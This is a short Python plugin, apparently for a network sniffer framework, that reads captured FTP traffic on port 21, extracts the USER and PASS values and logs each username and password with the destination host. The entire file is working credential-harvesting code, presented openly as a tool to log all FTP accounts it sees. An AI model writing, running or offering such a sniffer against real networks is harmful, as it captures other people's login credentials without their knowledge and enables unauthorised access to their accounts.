"""FTP password logger"""
PROPERTY={}
PROPERTY['NAME']="FTP Logger"
PROPERTY['DESC']="This logs all the FTP accounts"
PROPERTY['AUTHOR']='ntrippar'
PROPERTY['ENABLED']=True
PROPERTY['TYPE']='TCP'
PROPERTY['SPORT']=21
PROPERTY['DPORT']=21
user = None
passwd = None

class plugin():
    def __init__(self, traffic, logger):
        self.traffic = traffic
        self.logger = logger
    
    def analyze(self):
        global user, passwd
        data = self.traffic.data.data
        lines = data.split('\r\n')

        for line in lines:
            if(line[:4].lower() == "user"):
                user = line[5:]
            elif(line[:4].lower() == "pass"):
                passwd = line[5:]

        if (user != None and passwd != None):
            self.logger.addInfo('FTP',self.traffic.dst,user,passwd)
            user = None
            passwd = None
